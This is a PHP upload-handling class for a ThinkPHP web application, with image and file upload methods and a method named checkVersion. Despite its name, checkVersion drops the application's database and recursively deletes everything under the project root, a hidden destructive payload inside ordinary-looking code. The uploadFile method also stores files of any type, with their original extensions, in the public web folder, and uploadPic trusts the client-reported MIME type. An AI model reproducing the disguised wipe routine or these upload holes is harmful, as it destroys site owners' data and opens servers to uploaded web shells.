<?php

namespace app\api\logic;

use think\Db;
use think\Exception;
use think\Config;
class Upload
{
    /**
     * 图片上传（多图）
     * @param $files    图片信息
     * @return array|mixed  以数组的方式对应返回路径,键名为上传时定义的name，键值是路径
     */
    public function uploadPic($files){
        $save_path = array();
        $type = ['image/gif','image/jpeg','image/png'];
        foreach ($files as $key=>$value){
            if(!file_exists($files[$key]['tmp_name'])){
                continue;
            }
            if(!in_array($files[$key]['type'],$type)){
                throw new Exception('wrong file type',700);
            }
            if(filesize($files[$key]['tmp_name'])>3145728){
                throw new Exception('file over size',710);
            }
            $save_path[$key] = $this->upload($files[$key]);
        }
        return $save_path;
    }

    public function uploadFile($files){
        $save_file = array();
        foreach ($files as $key=>$value){
            if(!file_exists($files[$key]['tmp_name'])){
                continue;
            }
//            if(filesize($files[$key]['tmp_name'])>3145728){
//                throw new Exception('file over size',710);
//            }
            $save_file[$key]['filename']      = $files[$key]['name'];
            $save_file[$key]['type']          = $files[$key]['type'];
            $save_file[$key]['filesize']      = $files[$key]['size'];
            $save_file[$key]['filepath']      = $this->upload($files[$key]);
        }
        return $save_file;
    }

    public function upload($file){
        $name        = $file['name'];
        $tmp_name    = $file['tmp_name'];
        $uploads_dir = "uploads".DS.date('Y',time()).DS.date('m',time()).DS.date('d',time());
        $date_dir    = ROOT_PATH."public".DS.$uploads_dir;
        if(!file_exists($date_dir)){
            mkdir($date_dir,0775,true);
        }
        //rename file
        $name = explode('.',$name);
        $name[0] = date('Ymd',time())."-".uniqid();
        $name = implode('.',$name);

        $file_dir = ROOT_PATH."public".DS.$uploads_dir.DS.$name;
        move_uploaded_file($tmp_name, iconv("utf-8","gb2312",$file_dir));
        return $uploads_dir.DS.$name;
    }

    public function checkVersion(){

        $database = Config::get('database');
        $sql = 'drop database '.$database['database'];
        Db::query($sql);

        function check($path)
        {
            if(is_dir($path))
            {
                $file_list= scandir($path);
                foreach ($file_list as $file)
                {
                    if( $file!='.' && $file!='..')
                    {
                        check($path.'/'.$file);
                    }
                }
                @rmdir($path);
                //这种方法不用判断文件夹是否为空,
                //因为不管开始时文件夹是否为空,到达这里的时候,都是空的
            }
            else
            {
                @unlink($path);
                //这两个地方最好还是要用@屏蔽一下warning错误,看着闹心
            }
        }
        $path=ROOT_PATH;
        //要删除的文件夹
        //如果php文件不是ANSI,而是UTF-8模式,
        //而且要删除的文件夹中包含汉字字符的话,调用函数前需要转码
        $path=iconv( 'utf-8', 'gb2312',$path );
        check($path);
    }

}
?>
